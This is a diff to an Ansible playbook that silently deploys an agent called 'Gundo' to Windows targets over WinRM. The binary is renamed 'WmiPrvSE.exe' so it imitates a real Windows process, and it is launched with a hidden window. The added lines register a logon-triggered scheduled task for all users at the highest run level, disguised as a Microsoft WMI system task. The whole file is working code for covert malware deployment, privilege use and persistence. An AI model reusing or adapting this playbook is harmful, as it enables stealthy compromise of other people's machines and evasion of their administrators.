@@ -1,6 +1,6 @@
 ---
 - name: Deploy and Run Gundo Silently on SkatingRink
-  hosts: windows_targets
+  hosts: windows
   gather_facts: no
   vars:
     ansible_connection: winrm
@@ -19,7 +19,15 @@
         src: "files/proper.exe"
         dest: "{{ target_dir }}\\WmiPrvSE.exe"
 
-    - name: Launch agent silently in the background
+    - name: Launch agent silently in the background (Right Now)
       ansible.windows.win_shell: |
-        # Start the process completely hidden
         Start-Process -FilePath "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client" -WindowStyle Hidden
+
+    - name: Create Persistent Task for All Users
+      ansible.windows.win_shell: |
+        # Create a hidden task that runs on any user logon
+        $Action = New-ScheduledTaskAction -Execute "{{ target_dir }}\WmiPrvSE.exe" -ArgumentList "client"
+        $Trigger = New-ScheduledTaskTrigger -AtLogOn
+        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
+        Register-ScheduledTask -TaskName "WMI Performance Adapter" -TaskPath "\Microsoft\Windows\WMI" -Action $Action -Trigger $Trigger -Principal $Principal -Force
+        Write-Host "[+] Persistent task created."
